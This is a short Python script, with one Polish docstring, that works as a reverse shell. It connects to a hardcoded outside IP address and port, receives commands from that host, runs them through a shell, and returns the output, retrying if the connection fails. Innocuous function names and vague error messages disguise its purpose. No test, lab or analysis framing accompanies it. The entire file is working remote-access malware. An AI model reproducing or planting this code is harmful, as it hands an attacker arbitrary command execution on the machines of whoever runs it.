import socket
import subprocess
import time

def test_connection():
    """
    Funkcja wykonuje krótkie testowe połączenie, które trwa maksymalnie sekundę.
    """
    try:
        test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_socket.settimeout(1)
        test_socket.connect(("77.90.22.107", 12137))
        test_socket.close()
    except (socket.error, ConnectionError) as e:
        print("Err1.")

def client():
    retry_attempts = 2
    attempt = 0
    test_connection()

    while attempt < retry_attempts:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect(("77.90.22.107", 12137))
            print("Connected")

            while True:
                command = client_socket.recv(4096).decode()
                if not command:
                    break
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    client_socket.send(output)
                except subprocess.CalledProcessError as e:
                    error_message = f"Err2:\n{e.output.decode()}"
                    client_socket.send(error_message.encode())

            client_socket.close()

        except (socket.error, ConnectionError) as e:
            attempt += 1
            print(f"Err3. attempt {attempt}/{retry_attempts}.")
            time.sleep(2)

if __name__ == "__main__":
    client()
